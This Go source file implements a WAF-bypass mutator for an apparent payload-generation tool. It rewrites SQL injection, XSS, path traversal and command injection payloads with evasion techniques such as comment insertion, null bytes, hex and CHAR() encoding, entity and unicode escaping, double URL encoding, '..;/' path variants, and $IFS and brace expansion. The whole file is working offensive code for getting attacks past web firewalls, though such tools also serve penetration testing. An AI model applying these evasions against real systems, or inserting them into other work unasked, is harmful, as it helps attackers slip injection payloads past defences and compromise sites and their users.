// Package mutators implements payload mutation strategies
package mutators

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/yourusername/payload-forge/internal/core"
)

// WAFBypassMutator applies WAF evasion techniques to payloads
type WAFBypassMutator struct {
	name     string
	priority int
}

// NewWAFBypassMutator creates a new WAF bypass mutator
func NewWAFBypassMutator() *WAFBypassMutator {
	return &WAFBypassMutator{
		name:     "waf_bypass",
		priority: 3, // Apply after basic mutations
	}
}

// Name returns the mutator name
func (m *WAFBypassMutator) Name() string {
	return m.name
}

// Priority returns execution priority (lower = higher priority)
func (m *WAFBypassMutator) Priority() int {
	return m.priority
}

// Mutate applies WAF bypass techniques to create variations
func (m *WAFBypassMutator) Mutate(ctx context.Context, payload core.Payload) ([]core.Payload, error) {
	// Validate input
	if len(payload.Content) == 0 {
		return nil, fmt.Errorf("cannot mutate empty payload")
	}

	var mutations []core.Payload
	original := string(payload.Content)

	// Apply different WAF bypass techniques based on payload type
	switch payload.Type {
	case core.PayloadTypeSQLi:
		mutations = append(mutations, m.mutateSQLi(payload, original)...)
	case core.PayloadTypeXSS:
		mutations = append(mutations, m.mutateXSS(payload, original)...)
	case core.PayloadTypePathTraversal:
		mutations = append(mutations, m.mutatePathTraversal(payload, original)...)
	case core.PayloadTypeCommandInjection:
		mutations = append(mutations, m.mutateCommandInjection(payload, original)...)
	default:
		// Generic mutations for other types
		mutations = append(mutations, m.mutateGeneric(payload, original)...)
	}

	// Check context cancellation
	select {
	case <-ctx.Done():
		return mutations, ctx.Err()
	default:
	}

	return mutations, nil
}

// ============================================================================
// SQL INJECTION WAF BYPASS
// ============================================================================

func (m *WAFBypassMutator) mutateSQLi(payload core.Payload, original string) []core.Payload {
	var mutations []core.Payload

	// 1. Comment injection - breaks signature-based detection
	commentVariations := []string{
		m.injectInlineComments(original),
		m.injectBlockComments(original),
		m.injectMixedComments(original),
	}
	for _, variant := range commentVariations {
		if variant != original {
			mutations = append(mutations, m.createMutation(payload, variant, "comment_injection"))
		}
	}

	// 2. Whitespace manipulation - bypasses regex patterns
	whitespaceVariations := []string{
		m.addRandomWhitespace(original),
		m.replaceWithTabs(original),
		m.addNewlines(original),
		m.mixedWhitespace(original),
	}
	for _, variant := range whitespaceVariations {
		if variant != original {
			mutations = append(mutations, m.createMutation(payload, variant, "whitespace_manipulation"))
		}
	}

	// 3. Case alternation - bypasses case-sensitive filters
	caseVariations := []string{
		m.randomCase(original),
		m.upperLowerAlternate(original),
		strings.ToUpper(original),
	}
	for _, variant := range caseVariations {
		if variant != original {
			mutations = append(mutations, m.createMutation(payload, variant, "case_manipulation"))
		}
	}

	// 4. Null byte injection - breaks string processing in some WAFs
	if !strings.Contains(original, "\x00") {
		nullByteVariations := []string{
			original + "\x00",
			"\x00" + original,
			m.injectNullBytes(original),
		}
		for _, variant := range nullByteVariations {
			mutations = append(mutations, m.createMutation(payload, variant, "null_byte_injection"))
		}
	}

	// 5. Character substitution - bypasses keyword matching
	substitutionVariations := []string{
		m.substituteEqualsOperator(original),
		m.substituteSpaces(original),
		m.substituteQuotes(original),
	}
	for _, variant := range substitutionVariations {
		if variant != original {
			mutations = append(mutations, m.createMutation(payload, variant, "character_substitution"))
		}
	}

	// 6. SQL-specific obfuscation
	sqlObfuscation := []string{
		m.hexEncodeStrings(original),
		m.charFunction(original),
		m.concatenationBreak(original),
	}
	for _, variant := range sqlObfuscation {
		if variant != original && variant != "" {
			mutations = append(mutations, m.createMutation(payload, variant, "sql_obfuscation"))
		}
	}

	// 7. HPP (HTTP Parameter Pollution) variants
	hppVariants := []string{
		original + "&" + original,
		original + " " + original,
	}
	for _, variant := range hppVariants {
		mutations = append(mutations, m.createMutation(payload, variant, "hpp"))
	}

	return mutations
}

// ============================================================================
// XSS WAF BYPASS
// ============================================================================

func (m *WAFBypassMutator) mutateXSS(payload core.Payload, original string) []core.Payload {
	var mutations []core.Payload

	// 1. HTML encoding variations
	encodingVariations := []string{
		m.htmlEntityEncode(original),
		m.mixedEntityEncode(original),
		m.decimalEntityEncode(original),
		m.hexEntityEncode(original),
	}
	for _, variant := range encodingVariations {
		if variant != original {
			mutations = append(mutations, m.createMutation(payload, variant, "html_encoding"))
		}
	}

	// 2. Case obfuscation
	mutations = append(mutations,
		m.createMutation(payload, m.randomCase(original), "case_obfuscation"),
		m.createMutation(payload, m.upperLowerAlternate(original), "case_alternation"),
	)

	// 3. Whitespace and newline injection
	mutations = append(mutations,
		m.createMutation(payload, m.addRandomWhitespace(original), "whitespace_injection"),
		m.createMutation(payload, m.addNewlines(original), "newline_injection"),
	)

	// 4. Tag splitting
	if strings.Contains(original, "<script") {
		mutations = append(mutations,
			m.createMutation(payload, strings.ReplaceAll(original, "<script", "<scr\x00ipt"), "null_byte_split"),
			m.createMutation(payload, strings.ReplaceAll(original, "<script", "<sc\rrip\tt"), "control_char_split"),
		)
	}

	// 5. JavaScript obfuscation
	jsObfuscation := []string{
		m.jsStringConcat(original),
		m.jsUnicodeEscape(original),
		m.jsOctalEscape(original),
	}
	for _, variant := range jsObfuscation {
		if variant != original && variant != "" {
			mutations = append(mutations, m.createMutation(payload, variant, "js_obfuscation"))
		}
	}

	return mutations
}

// ============================================================================
// PATH TRAVERSAL WAF BYPASS
// ============================================================================

func (m *WAFBypassMutator) mutatePathTraversal(payload core.Payload, original string) []core.Payload {
	var mutations []core.Payload

	// 1. Encoding variations
	mutations = append(mutations,
		m.createMutation(payload, m.urlEncodePayload(original), "url_encoding"),
		m.createMutation(payload, m.doubleUrlEncode(original), "double_encoding"),
		m.createMutation(payload, m.unicodeEncode(original), "unicode_encoding"),
	)

	// 2. Path variations
	if strings.Contains(original, "../") {
		mutations = append(mutations,
			m.createMutation(payload, strings.ReplaceAll(original, "../", "..\\"), "backslash_variant"),
			m.createMutation(payload, strings.ReplaceAll(original, "../", "..;/"), "semicolon_injection"),
			m.createMutation(payload, strings.ReplaceAll(original, "../", "..%2f"), "slash_encoding"),
			m.createMutation(payload, strings.ReplaceAll(original, "../", "....//"), "double_slash"),
		)
	}

	// 3. Null byte termination
	mutations = append(mutations,
		m.createMutation(payload, original+"\x00", "null_termination"),
		m.createMutation(payload, original+"\x00.jpg", "null_extension_bypass"),
	)

	return mutations
}

// ============================================================================
// COMMAND INJECTION WAF BYPASS
// ============================================================================

func (m *WAFBypassMutator) mutateCommandInjection(payload core.Payload, original string) []core.Payload {
	var mutations []core.Payload

	// 1. Command separators
	if strings.Contains(original, ";") {
		mutations = append(mutations,
			m.createMutation(payload, strings.ReplaceAll(original, ";", "&&"), "and_separator"),
			m.createMutation(payload, strings.ReplaceAll(original, ";", "||"), "or_separator"),
			m.createMutation(payload, strings.ReplaceAll(original, ";", "|"), "pipe_separator"),
			m.createMutation(payload, strings.ReplaceAll(original, ";", "\n"), "newline_separator"),
		)
	}

	// 2. Quote variations
	mutations = append(mutations,
		m.createMutation(payload, m.addBackslashEscapes(original), "backslash_escape"),
		m.createMutation(payload, m.alternateQuotes(original), "quote_alternation"),
	)

	// 3. Variable expansion obfuscation
	mutations = append(mutations,
		m.createMutation(payload, m.bashVariableExpansion(original), "variable_expansion"),
		m.createMutation(payload, m.bashBraceExpansion(original), "brace_expansion"),
	)

	// 4. Whitespace variations
	mutations = append(mutations,
		m.createMutation(payload, m.bashIFS(original), "ifs_manipulation"),
		m.createMutation(payload, m.addRandomWhitespace(original), "whitespace_injection"),
	)

	return mutations
}

// ============================================================================
// GENERIC MUTATIONS
// ============================================================================

func (m *WAFBypassMutator) mutateGeneric(payload core.Payload, original string) []core.Payload {
	var mutations []core.Payload

	// Basic evasion techniques that work across payload types
	mutations = append(mutations,
		m.createMutation(payload, m.randomCase(original), "case_mutation"),
		m.createMutation(payload, m.addRandomWhitespace(original), "whitespace_injection"),
		m.createMutation(payload, m.urlEncodePayload(original), "url_encoding"),
		m.createMutation(payload, m.doubleUrlEncode(original), "double_encoding"),
	)

	return mutations
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

// Comment injection helpers
func (m *WAFBypassMutator) injectInlineComments(s string) string {
	// Insert /**/ between keywords
	s = strings.ReplaceAll(s, " ", "/**/")
	return s
}

func (m *WAFBypassMutator) injectBlockComments(s string) string {
	// Insert multi-line comments
	s = strings.ReplaceAll(s, " ", "/*comment*/")
	return s
}

func (m *WAFBypassMutator) injectMixedComments(s string) string {
	// Mix inline and block comments
	parts := strings.Fields(s)
	if len(parts) > 1 {
		return strings.Join(parts, "/**/--\n")
	}
	return s
}

// Whitespace manipulation
func (m *WAFBypassMutator) addRandomWhitespace(s string) string {
	return strings.ReplaceAll(s, " ", "  \t ")
}

func (m *WAFBypassMutator) replaceWithTabs(s string) string {
	return strings.ReplaceAll(s, " ", "\t")
}

func (m *WAFBypassMutator) addNewlines(s string) string {
	return strings.ReplaceAll(s, " ", "\n")
}

func (m *WAFBypassMutator) mixedWhitespace(s string) string {
	replacements := []string{" ", "\t", "\n", "\r", "\x0b"}
	result := s
	for i, char := range " " {
		if i%len(replacements) == 0 {
			result = strings.Replace(result, string(char), replacements[i%len(replacements)], 1)
		}
	}
	return result
}

// Case manipulation
func (m *WAFBypassMutator) randomCase(s string) string {
	result := ""
	for i, char := range s {
		if i%2 == 0 {
			result += strings.ToUpper(string(char))
		} else {
			result += strings.ToLower(string(char))
		}
	}
	return result
}

func (m *WAFBypassMutator) upperLowerAlternate(s string) string {
	result := ""
	upper := true
	for _, char := range s {
		if upper {
			result += strings.ToUpper(string(char))
		} else {
			result += strings.ToLower(string(char))
		}
		if strings.ContainsAny(string(char), "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") {
			upper = !upper
		}
	}
	return result
}

// Null byte injection
func (m *WAFBypassMutator) injectNullBytes(s string) string {
	words := strings.Fields(s)
	if len(words) > 1 {
		return strings.Join(words, "\x00")
	}
	return s
}

// Character substitution
func (m *WAFBypassMutator) substituteEqualsOperator(s string) string {
	// Replace = with LIKE for SQL
	return strings.ReplaceAll(s, "=", " LIKE ")
}

func (m *WAFBypassMutator) substituteSpaces(s string) string {
	// Replace space with +
	return strings.ReplaceAll(s, " ", "+")
}

func (m *WAFBypassMutator) substituteQuotes(s string) string {
	// Alternate between ' and "
	singleToDouble := strings.ReplaceAll(s, "'", "\"")
	if singleToDouble != s {
		return singleToDouble
	}
	return strings.ReplaceAll(s, "\"", "'")
}

// SQL obfuscation
func (m *WAFBypassMutator) hexEncodeStrings(s string) string {
	// Convert strings to hex: 'admin' -> 0x61646d696e
	if strings.Contains(s, "'") {
		parts := strings.Split(s, "'")
		if len(parts) >= 3 {
			str := parts[1]
			hex := "0x"
			for _, char := range str {
				hex += fmt.Sprintf("%x", char)
			}
			return strings.Replace(s, "'"+str+"'", hex, 1)
		}
	}
	return ""
}

func (m *WAFBypassMutator) charFunction(s string) string {
	// Convert to CHAR() function
	if strings.Contains(s, "'") {
		parts := strings.Split(s, "'")
		if len(parts) >= 3 {
			str := parts[1]
			charFunc := "CHAR("
			for i, char := range str {
				if i > 0 {
					charFunc += ","
				}
				charFunc += fmt.Sprintf("%d", char)
			}
			charFunc += ")"
			return strings.Replace(s, "'"+str+"'", charFunc, 1)
		}
	}
	return ""
}

func (m *WAFBypassMutator) concatenationBreak(s string) string {
	// Break strings with concatenation
	if strings.Contains(s, "SELECT") {
		return strings.ReplaceAll(s, "SELECT", "SEL'+'ECT")
	}
	return s
}

// HTML/XSS encoding
func (m *WAFBypassMutator) htmlEntityEncode(s string) string {
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, "\"", "&quot;")
	s = strings.ReplaceAll(s, "'", "&#x27;")
	return s
}

func (m *WAFBypassMutator) mixedEntityEncode(s string) string {
	// Mix decimal and hex entities
	result := ""
	for i, char := range s {
		if i%2 == 0 {
			result += fmt.Sprintf("&#%d;", char)
		} else {
			result += fmt.Sprintf("&#x%x;", char)
		}
	}
	return result
}

func (m *WAFBypassMutator) decimalEntityEncode(s string) string {
	result := ""
	for _, char := range s {
		result += fmt.Sprintf("&#%d;", char)
	}
	return result
}

func (m *WAFBypassMutator) hexEntityEncode(s string) string {
	result := ""
	for _, char := range s {
		result += fmt.Sprintf("&#x%x;", char)
	}
	return result
}

// JavaScript obfuscation
func (m *WAFBypassMutator) jsStringConcat(s string) string {
	if len(s) > 3 {
		mid := len(s) / 2
		return fmt.Sprintf("'%s'+'%s'", s[:mid], s[mid:])
	}
	return s
}

func (m *WAFBypassMutator) jsUnicodeEscape(s string) string {
	result := ""
	for _, char := range s {
		result += fmt.Sprintf("\\u%04x", char)
	}
	return result
}

func (m *WAFBypassMutator) jsOctalEscape(s string) string {
	result := ""
	for _, char := range s {
		result += fmt.Sprintf("\\%o", char)
	}
	return result
}

// URL encoding
func (m *WAFBypassMutator) urlEncodePayload(s string) string {
	result := ""
	for _, char := range s {
		if char > 127 || char == ' ' || char == '%' || char == '&' || char == '=' {
			result += fmt.Sprintf("%%%02X", char)
		} else {
			result += string(char)
		}
	}
	return result
}

func (m *WAFBypassMutator) doubleUrlEncode(s string) string {
	encoded := m.urlEncodePayload(s)
	return m.urlEncodePayload(encoded)
}

func (m *WAFBypassMutator) unicodeEncode(s string) string {
	result := ""
	for _, char := range s {
		result += fmt.Sprintf("%%u%04x", char)
	}
	return result
}

// Bash/Command injection helpers
func (m *WAFBypassMutator) addBackslashEscapes(s string) string {
	result := ""
	for _, char := range s {
		result += "\\" + string(char)
	}
	return result
}

func (m *WAFBypassMutator) alternateQuotes(s string) string {
	result := ""
	inQuote := false
	for _, char := range s {
		if char == ' ' && !inQuote {
			result += "'"
			inQuote = true
		} else if char == ' ' && inQuote {
			result += "'"
			inQuote = false
		}
		result += string(char)
	}
	return result
}

func (m *WAFBypassMutator) bashVariableExpansion(s string) string {
	// Use $* or $@ to obfuscate
	return strings.ReplaceAll(s, " ", "$IFS")
}

func (m *WAFBypassMutator) bashBraceExpansion(s string) string {
	// cat -> {cat,}
	words := strings.Fields(s)
	if len(words) > 0 {
		words[0] = "{" + words[0] + ",}"
		return strings.Join(words, " ")
	}
	return s
}

func (m *WAFBypassMutator) bashIFS(s string) string {
	// Replace spaces with $IFS
	return strings.ReplaceAll(s, " ", "${IFS}")
}

// Create mutation payload
func (m *WAFBypassMutator) createMutation(original core.Payload, content, technique string) core.Payload {
	mutation := original.Clone()
	mutation.Content = []byte(content)
	mutation.ID = fmt.Sprintf("%s_waf_%s_%d", original.ID, technique, time.Now().UnixNano())
	mutation.ParentID = original.ID

	if mutation.MutationSeq == nil {
		mutation.MutationSeq = []string{}
	}
	mutation.MutationSeq = append(mutation.MutationSeq, m.name+":"+technique)

	if mutation.Metadata == nil {
		mutation.Metadata = make(map[string]interface{})
	}
	mutation.Metadata["waf_bypass_technique"] = technique
	mutation.Metadata["mutation_depth"] = len(mutation.MutationSeq)

	// Add WAF bypass tag
	tagExists := false
	for _, tag := range mutation.Tags {
		if tag == "waf_bypass" {
			tagExists = true
			break
		}
	}
	if !tagExists {
		mutation.Tags = append(mutation.Tags, "waf_bypass", technique)
	}

	return mutation
}
